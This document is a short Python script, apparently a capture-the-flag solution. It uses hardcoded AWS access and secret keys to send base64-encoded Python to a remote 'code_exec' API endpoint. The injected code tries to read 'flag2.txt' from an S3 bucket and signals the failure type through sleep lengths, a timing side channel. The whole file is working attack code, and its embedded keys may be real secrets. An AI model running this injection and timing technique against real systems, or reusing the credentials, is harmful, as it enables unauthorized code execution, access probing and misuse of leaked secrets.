import base64
import requests
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIMLIFTXQE",
                       aws_secret_access_key="2pFYytUGEJ61BMm0LEWESi0d71uWsf2TjoGpwObR",
                       aws_token="",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_ex():
    code = f"""
import time
import boto3
from botocore.config import Config
config = Config(connect_timeout=2, read_timeout=2, retries={{'max_attempts': 0}})
s3 = boto3.client('s3', region_name='us-east-1', config=config)
try:
    s3.get_object(Bucket='userd8a2f72fe43094e8', Key='flag2.txt')
except Exception as e:
    ex_str = str(type(e))
    if 'ConnectTimeoutError' in ex_str:
        time.sleep(2.5)
    elif 'EndpointConnectionError' in ex_str:
        time.sleep(5.0)
    elif 'ClientError' in ex_str:
        time.sleep(7.5)
    else:
        time.sleep(10.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=12)
    except:
        pass
    elapsed = time.time() - start
    return elapsed

print("Exception test elapsed:", test_ex())
